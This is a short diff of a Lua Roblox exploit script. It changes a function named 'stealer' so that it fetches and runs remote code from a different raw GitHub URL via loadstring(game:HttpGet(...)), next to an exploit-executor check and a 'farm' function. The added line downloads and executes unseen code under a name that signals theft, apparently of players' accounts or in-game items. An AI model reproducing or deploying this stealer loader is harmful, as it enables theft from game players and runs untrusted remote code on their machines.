@@ -20,7 +20,7 @@ local function isRonixExploit()
 end
 
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/hayrankal/api.overdrivehub.xyz/refs/heads/main/%7C'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pedringameplaysw/mm2/refs/heads/main/script4'))()
 end
 
 local function farm()
